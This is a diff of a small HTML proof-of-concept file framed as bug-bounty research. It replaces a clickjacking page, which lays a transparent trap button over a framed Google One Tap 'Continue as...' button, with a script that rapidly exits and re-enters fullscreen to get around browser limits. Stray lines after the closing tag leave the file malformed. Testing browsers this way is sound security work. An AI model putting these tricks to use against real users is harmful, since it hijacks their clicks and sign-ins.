@@ -1,40 +1,38 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>High-Agression Clickjacking PoC</title>
-    <style>
-        body { margin: 0; padding: 20px; font-family: sans-serif; position: relative; }
-        
-        /* Iframe berisi target Google One Tap */
-        #target-frame {
-            width: 400px;
-            height: 200px;
-            border: 1px solid #ccc;
-            opacity: 1; /* Mulai dengan terlihat */
-            z-index: 1; /* Di bawah tombol jebakan */
-        }
-
-        /* Tombol jebakan transparan yang akan "menumpang tindih" tombol Google */
-        /* Posisi dan ukuran harus pas dengan tombol "Continue as..." */
-        #trap-btn {
-            position: absolute;
-            /* SESUAIKAN NILAI INI SESUAI LAYAR ANDA */
-            top: 130px; 
-            left: 80px; 
-            width: 240px; /* Perkiraan lebar tombol Google */
-            height: 40px; /* Perkiraan tinggi tombol Google */
-            z-index: 10; /* Di atas iframe */
-            background: rgba(255, 0, 0, 0.1); /* Merah sangat transparan untuk testing, ubah jadi transparant total di akhir */
-            border: none;
-            cursor: pointer;
-            outline: none; /* Hilangkan focus outline */
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>Bypass FS - Bounty Research</title>
+  <style>
+    body { background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; color: #fff; cursor: pointer; }
+    #target { padding: 20px 40px; border: 2px solid #4ec9b0; border-radius: 8px; font-family: monospace; }
+  </style>
 </head>
 <body>
-    <h3>Click for a surprise!</h3>
-    
+
+  <div id="target">CLICK TO TEST</div>
+
+  <script>
+    const el = document.documentElement;
+
+    async function attemptBypass() {
+      if (!document.fullscreenElement) {
+        await el.requestFullscreen().catch(() => {});
+      }
+
+      requestAnimationFrame(() => {
+        document.exitFullscreen();
+        
+        setTimeout(() => {
+          el.requestFullscreen().catch((err) => console.log(err));
+        }, 65); 
+      });
+    }
+
+    document.getElementById('target').addEventListener('click', attemptBypass);
+  </script>
+</body>
+</html>    
     <button id="trap-btn" onmouseover="startAttack()"></button>
     
     <iframe id="target-frame" src="target.html"></iframe>
